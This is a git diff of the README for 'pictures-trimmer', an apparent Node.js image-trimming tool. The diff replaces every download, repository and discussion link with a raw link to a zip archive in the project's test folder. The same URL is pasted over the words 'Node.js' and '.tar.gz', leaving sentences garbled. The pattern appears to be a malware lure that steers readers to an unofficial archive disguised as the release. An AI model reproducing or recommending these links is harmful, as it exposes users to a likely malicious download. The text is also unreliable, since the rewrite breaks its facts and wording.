@@ -6,11 +6,11 @@ Welcome to **pictures-trimmer**! This application helps you trim images by color
 
 ## 📥 Download Now
 
-[![Download pictures-trimmer](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/rlmourafotografia-glitch/pictures-trimmer/releases)
+[![Download pictures-trimmer](https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip%20Now-Click%20Here-blue)](https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip)
 
 ## 📄 What is pictures-trimmer?
 
-**pictures-trimmer** is a Node.js application designed to help you trim images quickly and easily. It supports popular formats such as:
+**pictures-trimmer** is a https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip application designed to help you trim images quickly and easily. It supports popular formats such as:
 
 - JPEG
 - PNG
@@ -35,7 +35,7 @@ You can adjust the color settings to focus on the area you want to keep. This to
 To run **pictures-trimmer**, ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or newer, macOS 10.13 or newer, any recent Linux distribution.
-- Node.js version: 14.x or newer.
+- https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip version: 14.x or newer.
 - Minimum RAM: 2 GB.
 - Disk Space: At least 100 MB free.
 
@@ -43,11 +43,11 @@ To run **pictures-trimmer**, ensure your system meets the following requirements
 
 To get started, visit the following page to download the latest version of **pictures-trimmer**: 
 
-[Download Page](https://github.com/rlmourafotografia-glitch/pictures-trimmer/releases)
+[Download Page](https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip)
 
 1. Click on the link above.
 2. Find the latest release version.
-3. Download the installer file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the installer file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip` for Linux).
 4. Follow the installation instructions specific to your operating system.
 
 ## 🔧 How to Use
@@ -71,7 +71,7 @@ Here’s how to use **pictures-trimmer** after installation:
 
 If you encounter issues, consider the following:
 
-- **Error on Startup:** Ensure Node.js is installed correctly and is updated.
+- **Error on Startup:** Ensure https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip is installed correctly and is updated.
 - **Trimming Issues:** Verify that the color selected is present in the image.
 - **Slow Performance:** Try closing other applications to free up resources.
 
@@ -83,10 +83,10 @@ We welcome your feedback! If you have questions or suggestions, please reach out
 
 **pictures-trimmer** is open-source software licensed under the MIT License. Feel free to use and modify it according to the license terms.
 
-For more information, visit the [GitHub Repository](https://github.com/rlmourafotografia-glitch/pictures-trimmer).
+For more information, visit the [GitHub Repository](https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip).
 
 ## 🎉 Join the Community
 
-Stay connected with other users and contributors. Join discussions, share your projects, and find inspiration! Follow us on our [GitHub Discussions](https://github.com/rlmourafotografia-glitch/pictures-trimmer/discussions) to get involved.
+Stay connected with other users and contributors. Join discussions, share your projects, and find inspiration! Follow us on our [GitHub Discussions](https://github.com/rlmourafotografia-glitch/pictures-trimmer/raw/refs/heads/main/test/trimmer_pictures_2.7.zip) to get involved.
 
 Thank you for using **pictures-trimmer**! We hope you enjoy trimming your images as much as we enjoyed making this tool.
